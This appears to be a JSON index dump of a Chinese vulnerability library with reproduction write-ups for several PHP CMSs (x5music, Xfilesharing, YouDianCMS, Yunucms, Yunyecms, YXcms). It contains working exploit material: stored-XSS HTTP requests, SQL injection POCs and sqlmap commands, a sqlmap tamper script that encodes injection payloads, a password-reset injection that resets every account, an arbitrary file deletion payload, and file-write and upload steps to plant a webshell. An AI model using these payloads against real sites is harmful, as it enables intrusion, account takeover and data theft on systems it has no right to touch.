由于服务端没有任何session验证，所有的数据来自客户端,修改客户端cookies符合它的逻辑即可绕过。 修改配置文件getshell 在admin/config.php中 elseif($action==\"admin\") { //站长信息 $cd_webqq=SafeRequest(\"cd_webqq\", \"post\"); $cd_webtel=SafeRequest(\"cd_webtel\", \"post\"); $cd_webemail=SafeRequest(\"cd_webemail\", \"post\"); //保存数据 $str=file_get_contents(\"../include/x5music.config.php\"); $str=preg_replace('/\"cd_webqq\",\"(.*?)\"/', '\"cd_webqq\",\"' . $cd_webqq . '\"', $str); $str=preg_replace('/\"cd_webtel\",\"(.*?)\"/', '\"cd_webtel\",\"' . $cd_webtel . '\"', $str); $str=preg_replace('/\"cd_webemail\",\"(.*?)\"/', '\"cd_webemail\",\"' . $cd_webemail . '\"', $str); if(!$fp=fopen('../include/x5music.config.php', 'w')) { showmessage(\"出错了，文件 ../include/x5music.config.php 没有写入权限！\", $_SERVER['HTTP_REFERER'], 0); } $ifile=new iFile('../include/x5music.config.php', 'w'); $ifile->WriteFile($str, 3); showmessage(\"恭喜您，保存设置成功！\", $_SERVER['HTTP_REFERER'], 0); 对变量$str进行粗糙的过滤后直接写入了配置文件x5music.config.php 而过滤仅仅过滤了'\"'号。过滤方式是对其转义。 在后台配置文件修改插入如下代码 这里由于\"被转义，再给它添加一个\\二次转义即可逃逸\"包裹. 参考链接 https://drops.org.cn/Code-Audit/x5music.html 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-02 13:21:09 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Xfilesharing/1.html":{"url":"0day/Xfilesharing/1.html","title":"（CVE-2019-18951）Xfilesharing 2.5.1本地文件上传getshell","keywords":"","body":"（CVE-2019-18951）Xfilesharing 2.5.1本地文件上传getshell 一、漏洞简介 二、漏洞影响 Version: 三、复现过程 任意文件上传 Shell : http://0-sec.org/cgi-bin/temp/joe/shell.php 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-24 17:16:40 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Xfilesharing/2.html":{"url":"0day/Xfilesharing/2.html","title":"（CVE-2019-18952）Xfilesharing 2.5.1本地文件包含","keywords":"","body":"（CVE-2019-18952）Xfilesharing 2.5.1本地文件包含 一、漏洞简介 二、漏洞影响 Version: 三、复现过程 本地文件包含 http://0-sec.org/?op=page&tmpl=../../admin_settings 此URL将获取“ admin_settings.html”模板，无需任何身份验证。“ .html”扩展名在服务器上进行了硬编码，因此所包含的文件必须在服务器上的任何位置都具有html扩展名。甚至可以通过上传html文件（例如“ upload.html”）并将“ sid”更改为“ ../../../../../../tmp”将LFI与任意文件上传漏洞合并，然后因此该文件将上传到服务器的tmp目录中。 http://0-sec.org/?op=page&tmpl=../../../../../../../tmp/upload Xfilesharing脚本也内置了短代码，因此您可以实现RCE通过将它们包括在“上传”中。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-24 17:19:30 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/YouDianCMS/1.html":{"url":"0day/YouDianCMS/1.html","title":"YouDianCMS 8.0 Storeage XSS","keywords":"","body":"YouDianCMS 8.0 Storeage XSS 一、漏洞简介 二、漏洞影响 YouDianCMS 8.0 三、复现过程 POST /index.php/Admin/wx/saveSubscribeReply HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0 Accept: application/json, text/javascript, /; q=0.01 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Referer: http://0-sec.org/index.php/Admin/Wx/subscribereply/l/en/random/1560696407129 X-Requested-With: XMLHttpRequest Content-Type: multipart/form-data; boundary=---------------------------17443203555821 Content-Length: 2207 DNT: 1 Connection: close Cookie: PHPSESSID=bkv171om25ji6a51t7dql010h2; youdianAdminLangSet=en; CKFinder_Path=Files%3A%2F%3A1; CKFinder_Settings=TNNDS; youdianMenuTopID=15 -----------------------------17443203555821 Content-Disposition: form-data; name=\"ReplyID\" 1 -----------------------------17443203555821 Content-Disposition: form-data; name=\"TypeID\" 1 -----------------------------17443203555821 Content-Disposition: form-data; name=\"a1\" \">alert(1) -----------------------------17443203555821 Content-Disposition: form-data; name=\"a2\" 2 -----------------------------17443203555821 Content-Disposition: form-data; name=\"a3\" 1 -----------------------------17443203555821 Content-Disposition: form-data; name=\"a4\" \">alert(1) -----------------------------17443203555821 Content-Disposition: form-data; name=\"a5\" 1 -----------------------------17443203555821 Content-Disposition: form-data; name=\"a6\" -----------------------------17443203555821 Content-Disposition: form-data; name=\"musicfile\" -----------------------------17443203555821 Content-Disposition: form-data; name=\"a11\" -----------------------------17443203555821 Content-Disposition: form-data; name=\"a12\" 1 -----------------------------17443203555821 Content-Disposition: form-data; name=\"a13\" -----------------------------17443203555821 Content-Disposition: form-data; name=\"a14\" -----------------------------17443203555821 Content-Disposition: form-data; name=\"a15\" \">alert(1) -----------------------------17443203555821 Content-Disposition: form-data; name=\"a16\" 1 -----------------------------17443203555821 Content-Disposition: form-data; name=\"a7\" 2 -----------------------------17443203555821 Content-Disposition: form-data; name=\"a8\" 2,大转盘 -----------------------------17443203555821 Content-Disposition: form-data; name=\"a10\" -----------------------------17443203555821 Content-Disposition: form-data; name=\"a9\" \">alert(1) -----------------------------17443203555821 Content-Disposition: form-data; name=\"IsEnable\" 1 -----------------------------17443203555821 Content-Disposition: form-data; name=\"hash\" 19b37a0a1054dfd209b9a17c704027f3_db90bddc24f4e98592b355e2cbbca612 -----------------------------17443203555821-- 该漏洞触发的位置在“微信平台”-“自动回复”-“跟踪自动回复”的“微信短信”中，最后点击保存触发。 四、参考链接 https://github.com/ReboOt68/youdiancms8.0-StoreageXSS-POC/issues/2 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-19 11:14:19 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/YouDianCMS/2.html":{"url":"0day/YouDianCMS/2.html","title":"YouDianCMS 8.0 sql注入漏洞","keywords":"","body":"YouDianCMS 8.0 sql注入漏洞 一、漏洞简介 二、漏洞影响 YouDianCMS 8.0 三、复现过程 漏洞分析 需要先登录此漏洞。页面可以注册。 http://localhost/youdiancms/index.php/public/reg/l/cn 在这里登录 漏洞位置位于index.php/member/customer/index搜索栏 未筛选搜索的关键字，导致sql注入漏洞 /App/Lib/Action/Member/CustomerAction.class.php： function saveModify(){ header(\"Content-Type:text/html; charset=utf-8\"); $this->_checkPost( $_POST ); unset( $_POST['InviterID'], $_POST['IsEnable']); $m = D('Admin/Member'); $inviterID = $m->where(\"MemberID={$_POST['MemberID']}\")->getField('InviterID'); //检查当前MemberID是否自己的客户 if( $inviterID == session('MemberID')){ if( $m->create() ){ if($m->save() === false){ $this->ajaxReturn(null, '修改失败!' , 0); }else{ $this->ajaxReturn(null, '修改成功!' , 1); } }else{ $this->ajaxReturn(null, $m->getError() , 0); } }else{ $this->ajaxReturn(null, '数据异常' , 0); } } 漏洞点在: $inviterID = $m->where(\"MemberID={$_POST['MemberID']}\")->getField('InviterID'); 上述代码直接将POST带入进了where子查询。 复现 POC： URL：http://www.0-sec.org/index.php/Member/Customer/saveModify POST：MemberName=xxxxx&MemberID=[SQL] 四、参考链接 https://blog.csdn.net/qq_36093477/article/details/98035255 http://www.f4ckweb.top/index.php/archives/45/ 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-19 10:52:46 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Yunucms/1.html":{"url":"0day/Yunucms/1.html","title":"Yunucms v2.0.7 后台xss","keywords":"","body":"Yunucms v2.0.7 后台xss 一、漏洞简介 云优CMS是一款基于TP5.0框架为核心开发的一套免费+开源的城市分站内容管理系统。云优CMS前身为远航CMS。云优CMS于2017年9月上线全新版本，二级域名分站，内容分站独立，七牛云存储，自定义字段，自定义表单，自定义栏目权限，自定义管理权限等众多功能深受用户青睐。 二、漏洞影响 Yunucms v2.0.7 三、复现过程 环境搭建 从官网下载源码并进行过安装 需要注意的是需要填云账号，我去官网注册了一个随便填上了，账号testqwe，密码123456，手机号利用的在线短信注册的 填上MySQL密码即可 前台界面 漏洞分析 http://www.0-sec.org/index.php?s=/admin/tagurl/addtagurl 该cms路由为目录/文件/方法，直接查看方法 public function addTagurl() { if(request()->isAjax()){ # 判断是否是ajax请求 $param = input('post.'); # 获取参数 $tagurl = new TagurlModel(); $flag = $tagurl->insertTagurl($param); # 将结果进行保存并返回响应 return json(['code' => $flag['code'], 'data' => $flag['data'], 'msg' => $flag['msg']]); } return $this->fetch(); } 跟进insertTagurl方法 public function insertTagurl($param) { try{ $result = $this->allowField(true)->save($param); # 保存当前数据对象 if(false === $result){ return ['code' => -1, 'data' => '', 'msg' => $this->getError()]; }else{ return ['code' => 1, 'data' => '', 'msg' => '添加TAG成功']; } }catch( PDOException $e){ return ['code' => -2, 'data' => '', 'msg' => $e->getMessage()]; } } 继续跟进save方法 if (!empty($data)) { // 数据自动验证 if (!$this->validateData($data)) { # 验证集为空，直接返回true return false; } // 数据对象赋值 foreach ($data as $key => $value) { $this->setAttr($key, $value, $data); # 将参数赋值给$this->data数组 } if (!empty($where)) { $this->isUpdate = true; } } ...... $result = $this->getQuery()->insert($this->data); ...... `` validateData方法需要验证集，而本身没有传入 protected function validateData($data, $rule = null, $batch = null) { $info = is_null($rule) ? $this->validate : $rule; if (!empty($info)) { ...... } return true; } 且$this->validate参数为空，因此直接返回true 跟进insert方法 ..... // 生成SQL语句 $sql = $this->builder->insert($data, $options, $replace); $bind = $this->getBind(); if ($options['fetch_sql']) { // 获取实际执行的SQL语句 return $this->connection->getRealSql($sql, $bind); } // 执行操作 $result = $this->execute($sql, $bind); fetch_sql变量为false，跟进execute方法 ...... if ($procedure) { # false $this->bindParam($bind); } else { $this->bindValue($bind); } ...... 最后跟进参数绑定方法 protected function bindValue(array $bind = []) { foreach ($bind as $key => $val) { // 占位符 $param = is_numeric($key) ? $key + 1 : ':' . $key; if (is_array($val)) { if (PDO::PARAM_INT == $val[1] && '' === $val[0]) { $val[0] = 0; } $result = $this->PDOStatement->bindValue($param, $val[0], $val[1]); } else { $result = $this->PDOStatement->bindValue($param, $val); } if (!$result) { throw new BindParamException( \"Error occurred when binding parameters '{$param}'\", $this->config, $this->getLastsql(), $bind ); } } } 可以看到最后是调用PDO对象对参数进行的绑定，除此之外并没有任何过滤，因此XSS代码可插入并执行 漏洞复现 后台TAG管理模块 进行添加TAG 在名称处填入XSS代码并提交 返回模块即可看到效果 查看源码，发现已经插入 查看数据库 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-17 20:23:49 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Yunucms/2.html":{"url":"0day/Yunucms/2.html","title":"Yunucms v2.0.7 数据库泄露","keywords":"","body":"Yunucms v2.0.7 数据库泄露 一、漏洞简介 云优CMS是一款基于TP5.0框架为核心开发的一套免费+开源的城市分站内容管理系统。云优CMS前身为远航CMS。云优CMS于2017年9月上线全新版本，二级域名分站，内容分站独立，七牛云存储，自定义字段，自定义表单，自定义栏目权限，自定义管理权限等众多功能深受用户青睐。 二、漏洞影响 Yunucms v2.0.7 三、复现过程 漏洞分析 POST /index.php?s=/admin/data/export HTTP/1.1 public function export($ids = null, $id = null, $start = null) { $Request = Request::instance(); if ($Request->isPost() && !empty($ids) && is_array($ids)) { //初始化 $path = config('data_backup_path'); is_dir($path) || mkdir($path, 755, true); //读取备份配置 $config = [ 'path' => realpath($path) . DIRECTORY_SEPARATOR, 'part' => config('data_backup_part_size'), 'compress' => config('data_backup_compress'), 'level' => config('data_backup_compress_level'), ]; //检查是否有正在执行的任务 $lock = \"{$config['path']}backup.lock\"; if (is_file($lock)) { return $this->error('检测到有一个备份任务正在执行，请稍后再试，或手动删除\"'.$lock.'\"后重试！'); } file_put_contents($lock, $Request->time()); //创建锁文件 //检查备份目录是否可写 is_writeable($config['path']) || $this->error('备份目录不存在或不可写，请检查后重试！'); session('backup_config', $config); //生成备份文件信息 $file = [ 'name' => date('Ymd-His', $Request->time()), 'part' => 1, ]; session('backup_file', $file); //缓存要备份的表 session('backup_tables', $ids); //创建备份文件 $Database = new \\com\\Database($file, $config); if (false !== $Database->create()) { $tab = ['id' => 0, 'start' => 0]; return $this->success('初始化成功！', '', ['tables' => $ids, 'tab' => $tab]); } else { return $this->error('初始化失败，备份文件创建失败！'); } } ...... 可以看到，备份文件的命名用的time方法，跟进 public function time($float = false) { return $float ? $_SERVER['REQUEST_TIME_FLOAT'] : $_SERVER['REQUEST_TIME']; } 可以看到利用REQUEST_TIME进行构造文件名，因此可以直接爆破得到并下载。 漏洞复现 在后台系统管理->数据库管理模块将所有数据库备份 查看本地文件，所有备份保存在data目录下，发现名命是以时间命名，可以直接爆破得到 从前台访问并下载 下载完成后打开，泄露所有数据库信息 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-17 20:27:43 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Yunyecms/Yunyecms V2.0.2 前台注入漏洞.html":{"url":"0day/Yunyecms/Yunyecms V2.0.2 前台注入漏洞.html","title":"Yunyecms V2.0.2 前台注入漏洞（一）","keywords":"","body":"Yunyecms V2.0.2 前台注入漏洞（一） 一、漏洞简介 云业CMS内容管理系统是由云业信息科技开发的一款专门用于中小企业网站建设的PHP开源CMS，可用来快速建设一个品牌官网(PC，手机，微信都能访问)，后台功能强大，安全稳定，操作简单。 二、漏洞影响 yunyecms 2.0.2 三、复现过程 漏洞分析 下载源码，搭建起来，打开登录页面。 http://127.0.0.1/yunyecms_2.0.2/admin.php?c=login&= 1 打开Seay源代码审计工具，分析代码。 经过一番寻找与“提示”，发现getip()方法获取ip没有进行过滤，可能有戏。 搜索getip()函数，发现login.php调用了该函数，变量为$logiparr。 跟踪该变量，发现CheckLoginTimes函数调用该变量。 去到该函数定义处，发现我们的ip变量没有进行任何过滤直接由GetCount函数执行。 漏洞发现 $cnt=$this->db->GetCount(\"select count(*) as total from `#yunyecms_adminloginfail` where ip='$ip' and failtimes>=\".ADMLOGIN_MINUTES.\" and lastlogintime>$checktime limit 1\"); 可以看出，我们可以构造该ip变量达到注入目的，打开burp抓包。 发送到Repeater模块，构造参数，可以看到sql报错。 进一步利用，得到数据库名称，漏洞存在。 漏洞利用 将抓的包保存下来，使用sqlmap去跑就可以了。 sqlmap.py -r C:\\Users\\Administrator\\Desktop\\yunye.txt --batch 参考链接 http://www.freesion.com/article/7074313754/ 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-09 02:37:50 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Yunyecms/1.html":{"url":"0day/Yunyecms/1.html","title":"Yunyecms V2.0.2 前台注入漏洞（二）","keywords":"","body":"Yunyecms V2.0.2 前台注入漏洞（二） 一、漏洞简介 云业CMS内容管理系统是由云业信息科技开发的一款专门用于中小企业网站建设的PHP开源CMS，可用来快速建设一个品牌官网(PC，手机，微信都能访问)，后台功能强大，安全稳定，操作简单。 二、漏洞影响 yunyecms 2.0.2 三、复现过程 问题出现在前台me***.php文件中，自定义表单customform中的userid从cookie中获取，截取一段数据包可以看到cookie的userid如下： 经过了加密处理，根据解密算法yunyecms_strdecode可以在corefun.php找到对应的加解密算法 因为cookie里的userid可控因此我们根据算法流程我们可以在cookie中伪造userid值。还是用刚刚以上截取的userid测试。 可以看到真实的userid为9。构造一个SQL注入，生成如下payload： YmM0OWM5ZWY1ODk5ZGRkNzM0T1NjZ1lXNWtJSE5zWldWd0tEVXA4ZDdlNzk5NTliNDQyYTI1ZDE0ZWUzODZmZDI4MzY5OTM0YQ== payload生成代码front-test.php为： 继续追溯可控的userid,可以看到userid经过步骤3->4->5传递到了pagelist函数中 跟入pagelist函数，将$where拼接到了sql查询语句中$sqlcnt,然后交给了前几次SQL注入都出现的SQL查询函数GetCount中。 详细查看下该函数，直接进行了sql查询。 附上截 手工有点麻烦，又想丢入sqlmap怎么办，由于userid经过了加密和编码处理，于是根据算法流程写一个tamper就可以很好的解决了， 对应tamper的的脚本为 yunyecms_front_sqli_tamp.py #!/usr/bin/env python \"\"\" Copyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/) See the file 'LICENSE' for copying permission \"\"\" import base64 import hashlib from lib.core.enums import PRIORITY from lib.core.settings import UNICODE_ENCODING __priority__ = PRIORITY.LOW def dependencies(): pass def md5(data): hash_md5 = hashlib.md5(data) md5data=hash_md5.hexdigest()[8:18] return md5data def sha1(data): string_sha1=hashlib.sha1(data).hexdigest()[0:35] return string_sha1 def yunyecms_strencode(string): salt='~^y#u%n$y^e*c%m^s^~' return base64.b64encode(md5(salt)+base64.b64encode(string)+sha1(salt)) def tamper(payload, **kwargs): \"\"\" Base64-encodes all characters in a given payload >>> tamper(\"1' AND SLEEP(5)#\") 'MScgQU5EIFNMRUVQKDUpIw==' \"\"\" return yunyecms_strencode(payload) if payload else payload 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-09 02:37:43 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Yunyecms/Yunyecms V2.0.2 后台注入漏洞.html":{"url":"0day/Yunyecms/Yunyecms V2.0.2 后台注入漏洞.html","title":"Yunyecms V2.0.2 后台注入漏洞（一）","keywords":"","body":"Yunyecms V2.0.2 后台注入漏洞（一） 一、漏洞简介 云业CMS内容管理系统是由云业信息科技开发的一款专门用于中小企业网站建设的PHP开源CMS，可用来快速建设一个品牌官网(PC，手机，微信都能访问)，后台功能强大，安全稳定，操作简单。 二、漏洞影响 yunyecms 2.0.2 三、复现过程 漏洞分析 废话不多说，又经过一番寻找与“提示”，发现core/admin/deparment.php文件，其中id值是通过post直接获取的，然后被edit_admin_department()调用。 去到edit_admin_department()函数定义处，发现过滤语句。 但是仔细一看，发现代码只是过滤了departmentname和olddepartmentname两个变量，放过了我们的id变量，只是判断id值是否为空。 if($departmentname!=$olddepartmentname){ $num=$this->db->GetCount(\"select count(*) as total from `#yunyecms_department` where departmentname='$departmentname' and departmentid<>$id limit 1\"); if($num){ messagebox(Lan('department_already_exist'),url_admin('department_add','','',$this->hashurl['usvg']),\"warn\"); } } 从代码可以看出，如果departmentname的值不等于olddepartmentname，就执行sql语句，我们的id值没有任何过滤出现在sql语句中，应该有注入无疑了。 漏洞复现 来到core/admin/deparment.php所在的页面，即后台的部门管理处。 修改部门名字，只要前后名字不一致即可，使用burp抓包。 发送到Repeater模块，构造参数，可以看到sql报错。 不想动手，就扔到sqlmap去跑就完事了。 sqlmap.py -r C:\\Users\\Administrator\\Desktop\\yunye.txt --batch 参考链接 http://www.freesion.com/article/9029315473/ 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-09 02:38:51 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Yunyecms/2.html":{"url":"0day/Yunyecms/2.html","title":"Yunyecms V2.0.2 后台注入漏洞（二）","keywords":"","body":"Yunyecms V2.0.2 后台注入漏洞（二） 一、漏洞简介 云业CMS内容管理系统是由云业信息科技开发的一款专门用于中小企业网站建设的PHP开源CMS，可用来快速建设一个品牌官网(PC，手机，微信都能访问)，后台功能强大，安全稳定，操作简单。 二、漏洞影响 yunyecms 2.0.2 三、复现过程 漏洞出现在在后台文件de***.php中，de***_add函数对GET和POST参数先进行了是否empty判断，最终将传入的几个参数传给了edit_admin_department。 跟入edit_admin_department，对参数依次进行了处理，但是发现只有$departmentname,$olddepartmentname进行了usafestr安全过滤，漏网的$id拼接到了sql语句中执行。 最终导致了SQL注入。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-09 02:41:44 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/YXcms/2.html":{"url":"0day/YXcms/2.html","title":"YXcmsApp 1.4.3任意用户密码重置漏洞","keywords":"","body":"YXcms 1.4.3 任意用户密码重置漏洞 一、漏洞简介 二、漏洞影响 2017-03-26 YXcmsApp 1.4.3 三、复现过程 漏洞原理 从框架上（基于CanPHP的二次开发）看不出来什么缺陷，那就来看看代码逻辑上有什么披露。来到protected/apps/member/controller/indexController.php中是一些关于会员账号的逻辑，其中的getpassword函数是找回密码的功能，其中分为两步：第一步根据用户名或者邮箱向注册的邮件发送重置密码链接；第二步根据重置密码的链接重置用户密码，然后再将新密码发送到对应邮箱。第二步代码如下： 这里的ENCODE_KEY是在安装时生成的6位密钥，想通过构造$_GET['code']来重置其他用户的密码初步是不现实的。 但之后又看到在regist功能中，第176行调用了自定义的set_cookie函数，如下： 跟进set_cookie函数，是在protected/include/lib/common.function.php中607行定义，如下： 这里是用ENCODE_KEY对原值进行加密再设置cookie。所以萌生了一个想法，将注册后对应设置的auth cookie作为getpassword的code，就可以正确地进行解密，解密后的内容即为regist函数中第175行拼接的字符串： $cookie_auth = $id.'\\t'.$data['groupid'].'\\t'.$data['account'].'\\t'.$data['nickname'].'\\t'.$data['lastip']; 其中会对account的格式进行校验，ip也是正则匹配的结果无法伪造，那么可控的就只有nickname了，我们可以跟踪一下nickname的过滤过程，首先是进入common.function.php的in函数： 接着就直接连接成字符串，虽然htmlspecialchars函数默认不会对单引号编码，但是addslashes函数会对单引号转义，这里的nickname就无法利用了。 可是再往上看login逻辑时，发现在登陆成功后就会从数据库中取出账号信息，拼接成字符串设置为对应的auth cookie，如下： 我们可以考虑考虑二次注入的可能性，但还是需要跟踪一下在regist时insert数据是如何过滤的，最后可以跟到在protected/include/core/db/cpMysql.class.php中escape函数对数据进行了过滤： 因为在登陆成功后是直接拼接字符串就加密，所以单引号还是能够还原出来的，单引号的整个输入输出过程如下： 所以我们可以注册个带单引号nickname的账号，注册成功后退出重新登陆，使用auth cookie来作为重置密码的code，就会产生报错，如下（因为在解密的时候会把code进行urldecode，所以需要把cookie中的+改为%252B，/改为%252F）： 漏洞证明 漏洞的本质是二次注入 ，但是我们在数据库中可以看到nickname限制为30个字符，而且在这里我们可控的也只有nickname，所以进行报错注入几乎是不可能了。 既然是在找回密码处的二次注入，就看看能不能重置任意用户名的密码。还是再来看看getpassword函数的逻辑： 假如说我们的payload改为' or 1=1# 那么肯定是可以将所有用户的密码都update为同一个newpass，这个newpass还是会发给info['email']这个邮箱的，跟进187行看看find函数的结果是否是我们可控的，在protected/include/core/cpModel.calss.php中： find函数虽然加了一个limit 1的条件，但返回的也还是结果中的第一个值，所以如果我们能把自己邮箱排到查询结果中的首位就可以从邮件中知晓所有账号的新密码了。 因为是利用新注册的账号来产生payload，很容易就可以想到payload为' or 1=1 order by id desc# 然后注册账号，重新登陆，直接上code访问，可以监控到mysql执行语句如下： 顺利收到新密码的邮件： 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-03 18:35:11 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/YXcms/3.html":{"url":"0day/YXcms/3.html","title":"YXCMS 1.4.7储存型xss","keywords":"","body":"YXcms 1.4.7 储存型xss 一、漏洞简介 二、漏洞影响 YXcms 1.4.7 三、复现过程 漏洞分析 前台的文件源码protected/apps/default/controller/columnController.php public function index() { $ename=in($_GET['col']); if(empty($ename)) throw new Exception('栏目名不能为空~', 404); $sortinfo=model('sort')->find(\"ename='{$ename}'\",'id,name,ename,path,url,type,deep,method,tplist,keywords,description,extendid'); $path=$sortinfo['path'].','.$sortinfo['id']; $deep=$sortinfo['deep']+1; $this->col=$ename; switch ($sortinfo['type']) { case 1://文章 $this->newslist($sortinfo,$path,$deep); break; case 2://图集 $this->photolist($sortinfo,$path,$deep); break; case 3://单页 $this->page($sortinfo,$path,$deep); break; case 4://应用 break; case 5://自定义 break; case 6://表单 $this->extend($sortinfo,$path,$deep); break; default: throw new Exception('未知的栏目类型~', 404); break; } } 后台的文件源码protected/apps/admin/controller/extendfieldController.php public function mesedit() { $tableid=intval($_GET['tabid']); if(!$this->checkConPower('extend',$tableid)) $this->error('您没有权限管理此独立表内容~'); $id=intval($_GET['id']);//信息id if(empty($tableid) || empty($id) ) $this->error('参数错误~'); $tableinfo = model('extend')->select(\"id='{$tableid}' OR pid='{$tableid}'\",'id,tableinfo,name,type,defvalue','pid,norder DESC'); if(empty($tableinfo)) $this->error('自定义表不存在~'); if (!$this->isPost()) { $info=model('extend')->Extfind($tableinfo[0]['tableinfo'],\"id='{$id}'\"); $this->info=$info; $this->tableid=$tableid; $this->id=$id; $this->tableinfo=$tableinfo; $this->display(); }else{ for($i=1;$iExtup($tableinfo[0]['tableinfo'],\"id='{$id}'\",$data)) $this->success('修改成功~',url('extendfield/meslist',array('id'=>$tableid))); else $this->error('信息修改失败~'); } } 中间没什么过滤 复现 http://0-sec.org/index.php?r=default/column/index&col=guestbook payload： 然后登陆后台，查看审核 点击编辑 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-03 18:35:17 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/YXcms/4.html":{"url":"0day/YXcms/4.html","title":"YXCMS 1.4.7任意文件删除","keywords":"","body":"YXcms 1.4.7 任意文件删除 一、漏洞简介 二、漏洞影响 YXcms 1.4.7 三、复现过程 漏洞分析 漏洞文件：protected/apps/admin/controller/photoController.php,在第355行的delpic()函数，可以看到$picname接收POST过来的值，然后$path等于文件开头定义的静态变量 static protected $uploadpath='';//图片上传路径 没有对传入的值进行任何的过滤，使用函数file_exists()判断一下文件是否存在就给unlink执行删除文件了。 public function delpic() { if(empty($_POST['picname'])) $this->error('参数错误~'); $picname=$_POST['picname']; $path=$this->uploadpath; if(file_exists($path.$picname)) @unlink($path.$picname); else{echo '图片不存在~';return;} if(file_exists($path.'thumb_'.$picname)) @unlink($path.'thumb_'.$picname); else {echo '缩略图不存在~';return;} echo '原图以及缩略图删除成功~'; } 复现 需要先登录后台，然后访问之后会显示缩略图不存在 payload http://0-sec.org/index.php%3Fr%3Dadmin/photo/delpic POST： picname=../../protected/apps/install/install.lock 然后访问网站首页就会自动转到安装的页面 看到目录下的install.lock文件已经被删除了 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-03 18:38:08 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/YXcms/5.html":{"url":"0day/YXcms/5.html","title":"YXCMS 1.4.7任意文件写入","keywords":"","body":"YXcms 1.4.7 任意文件写入 一、漏洞简介 二、漏洞影响 YXcms 1.4.7 三、复现过程 漏洞分析 漏洞文件protected/apps/admin/controller/setController.php的140行，$tpfile接收到GET传过来的值，如果为空的话就会报非法操作。传过来的URL是admin/set/tpadd&Mname=default，所以$tpfile就是default。 再来下是检测是否有POST的值，接受到POST过来的filename,用trim去掉两边的空格。接收到POST过来的code，用stripcslashes反转义。 $filepath=$templepath.$filename.'.php'这一句是路径和文件的拼接，然后下面检测路径是否存在。 最后没有过滤任何的危险函数就传给file_put_contents函数，写入网站的目录。 public function tpadd() { $tpfile=$_GET['Mname']; if(empty($tpfile)) $this->error('非法操作~'); $templepath=BASE_PATH . $this->tpath.$tpfile.'/'; if($this->isPost()){ $filename=trim($_POST['filename']); $code=stripcslashes($_POST['code']); if(empty($filename)||empty($code)) $this->error('文件名和内容不能为空'); $filepath=$templepath.$filename.'.php'; if($this->ifillegal($filepath)) {$this->error('非法的文件路径~');exit;} try{ file_put_contents($filepath, $code); } catch(Exception $e) { $this->error('模板文件创建失败！'); } $this->success('模板文件创建成功！',url('set/tplist',array('Mname'=>$tpfile))); }else{ $this->tpfile=$tpfile; $this->display(); } } 复现 http://0-sec.org/index.php%3Fr%3Dadmin/set/tpadd%26Mname%3Ddefault 打开我们的文件监控软件FolderChangesView，输入我们的程序路径D:\\phpStudy\\PHPTutorial\\WWW\\YXcms 然后写shell.php文件名，写入我们的代码。 然后会在\\protected\\apps\\default\\view\\default下面生成我们写入的文件。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-03 18:38:06 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/YXcms/6.html":{"url":"0day/YXcms/6.html","title":"YXCMS 1.4.7SQL注入","keywords":"","body":"YXcms 1.4.7 sql注入 一、漏洞简介 二、漏洞影响 YXcms 1.4.7 三、复现过程 漏洞分析 查看漏洞文件protected/apps/admin/controller/fragmentController.php的第63行 public function del() { if(!$this->isPost()){ $id=intval($_GET['id']); if(empty($id)) $this->error('您没有选择~'); 